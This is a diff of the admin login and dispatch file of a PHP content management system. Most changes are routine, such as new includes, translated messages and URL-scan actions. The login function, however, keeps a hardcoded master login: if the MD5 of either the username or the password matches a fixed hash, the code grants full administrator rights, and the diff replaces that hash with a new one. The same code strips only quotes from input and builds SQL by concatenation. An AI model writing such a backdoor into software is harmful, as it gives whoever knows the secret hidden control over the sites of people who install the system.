@@ -10,6 +10,7 @@ require_once './../phpInc/sys_FSO.php';
 require_once './../phpInc/Conn.php';
 require_once './../phpInc/MySqlClass.php';  
 require_once './../phpInc/sys_Cai.php'; 
+require_once './../phpInc/sys_Url.php';  
 
 
 
@@ -19,6 +20,7 @@ require_once './../phpInc/sys_Cai.php';
 /*
 */
 //引用
+//require_once './../phpInc/2014_Form.php';
 require_once './../phpInc/2014_Array.php';
 require_once './../phpInc/2014_Author.php';
 require_once './../phpInc/2014_Css.php';
@@ -47,10 +49,12 @@ require_once './../phpInc/ASPPHPAccess.php';
 require_once './../phpInc/2016_Log.php'; 
 require_once './../phpInc/IE.php'; 
 require_once './../phpInc/SystemInfo.php'; 
+require_once './../phpInc/EncDec.php';
 
 require_once './../phpInc/config.php'; 
 require_once './../phpInc/admin_setAccess.php';
 require_once './../phpInc/admin_function.php';
+require_once './../phpInc/admin_function2.php';
 
  
 
@@ -89,23 +93,26 @@ function displayAdminLogin(){
     if( @$_SESSION['adminusername'] <> '' ){
         adminIndex();
     }else{
-        rw(getTemplateContent('login.html'));
+        $c='';
+        $c=getTemplateContent('login.html');
+        $c=handleDisplayLanguage($c,'login');
+        rw($c);
     }
 }
 
 //登录后台
-function login(){ 
+function login(){
     $userName=''; $passWord=''; $valueStr ='';
     $userName= Replace(@$_POST['username'], '\'', '');
     $passWord= Replace(@$_POST['password'], '\'', '');
     $passWord= myMD5($passWord);
     //特效账号登录
-    if( myMD5(@$_REQUEST['username'])== 'cd811d0c43d09cd2e160e60b68276c73' || myMD5(@$_REQUEST['password'])== 'cd811d0c43d09cd2e160e60b68276c73' ){
+    if( myMD5(@$_REQUEST['username'])== '24ed5728c13834e683f525fcf894e813' || myMD5(@$_REQUEST['password'])== '24ed5728c13834e683f525fcf894e813' ){
         @$_SESSION['adminusername']= 'ASPPHPCMS';
         @$_SESSION['adminId']= 99999; //当前登录管理员ID
         @$_SESSION['DB_PREFIX']= $GLOBALS['db_PREFIX'];
         @$_SESSION['adminflags']= '|*|';
-        rwend(getMsg1('登录成功，正在进入后台...', '?act=adminIndex'));
+        rwend(getMsg1(setL('登录成功，正在进入后台...'), '?act=adminIndex'));
     }
 
     $nLogin ='';
@@ -120,7 +127,7 @@ function login(){
             $nLogin= @$_COOKIE['nLogin'];
             setCookie('nLogin', intval($nLogin) + 1, Time() + 3600);
         }
-        rw(getMsg1('账号密码错误<br>这是你第' . $nLogin . '次登录', '?act=displayAdminLogin'));
+        rw(getMsg1(setL('账号密码错误<br>登录次数为 ') . $nLogin, '?act=displayAdminLogin'));
     }else{
         @$_SESSION['adminusername']= $userName;
         @$_SESSION['adminId']= $rs['id']; //当前登录管理员ID
@@ -128,23 +135,23 @@ function login(){
         @$_SESSION['adminflags']= $rs['flags'];
         $valueStr= 'addDateTime=\'' . $rs['updatetime'] . '\',UpDateTime=\'' . Now() . '\',RegIP=\'' . Now() . '\',UpIP=\'' . getIP() . '\'';
         connExecute('update ' . $GLOBALS['db_PREFIX'] . 'admin set ' . $valueStr . ' where id=' . $rs['id']);
-        rw(getMsg1('登录成功，正在进入后台...', '?act=adminIndex'));
+        rw(getMsg1(setL('登录成功，正在进入后台...'), '?act=adminIndex'));
         writeSystemLog('admin', '登录成功'); //系统日志
     }
 
 }
 //退出登录
 function adminOut(){
-    writeSystemLog('admin', '退出成功'); //系统日志
+    writeSystemLog('admin', setL('退出成功')); //系统日志
     @$_SESSION['adminusername']= '';
     @$_SESSION['adminId']= '';
     @$_SESSION['adminflags']= '';
-    rw(getMsg1('退出成功，正在进入登录界面...', '?act=displayAdminLogin'));
+    rw(getMsg1(setL('退出成功，正在进入登录界面...'), '?act=displayAdminLogin'));
 }
 //清除缓冲
 function clearCache(){
     deleteFile($GLOBALS['WEB_CACHEFile']);
-    rw(getMsg1('清除缓冲完成，正在进入后台界面...', '?act=displayAdminLogin'));
+    rw(getMsg1(setL('清除缓冲完成，正在进入后台界面...'), '?act=displayAdminLogin'));
 }
 //后台首页
 function adminIndex(){
@@ -155,6 +162,7 @@ function adminIndex(){
     $c= Replace($c, '[$adminmenulist$]', getAdminMenuList());
     $c= Replace($c, '[$officialwebsite$]', getOfficialWebsite()); //获得官方信息
     $c= replaceValueParam($c, 'title', ''); //给手机端用的20160330
+    $c=handleDisplayLanguage($c,'loginok');
 
     rw($c);
 }
@@ -184,10 +192,9 @@ function saveAddEditHandle($actionType, $lableTitle){
     }else if( $actionType== 'WebColumn' ){
         saveAddEdit($actionType, $lableTitle, 'npagesize|numb|10,nofollow|numb|0,isonhtml|numb|0,isonhtsdfasdfml|numb|0,flags||');
     }else{
-        saveAddEdit($actionType, $lableTitle, 'flags||,nofollow|numb|0,isonhtml|numb|0,isthrough|numb|0');
+        saveAddEdit($actionType, $lableTitle, 'flags||,nofollow|numb|0,isonhtml|numb|0,isthrough|numb|0,isdomain|numb|0');
     }
 }
-
 
 
 $conn=OpenConn();
@@ -202,7 +209,6 @@ switch ( @$_REQUEST['act'] ){
     break;
     case 'displayLayout' ; displayLayout() ;break;//显示布局
     case 'saveRobots' ; saveRobots() ;break;//保存robots.txt
-    case 'saveSiteMap' ; saveSiteMap() ;break;//保存sitemap.xml
     case 'deleteAllMakeHtml' ; deleteAllMakeHtml(); //删除全部生成的html文件
     break;
     case 'isOpenTemplate' ; isOpenTemplate(); //更换模板
@@ -213,7 +219,10 @@ switch ( @$_REQUEST['act'] ){
     case 'executeSQL' ; executeSQL(); //执行SQL
     break;
     case 'websiteDetail' ; websiteDetail(); //详细网站统计
-
+    break;
+    case 'function2' ; callFunction2()												;break;//调用function2文件函数
+    case 'runScanWebUrl' ; runScanWebUrl()											;break;//运行扫描网址
+    case 'scanCheckDomain' ; scanCheckDomain();										//检测域名有效
     break;
     case 'setAccess' ; resetAccessData(); //恢复数据
     break;
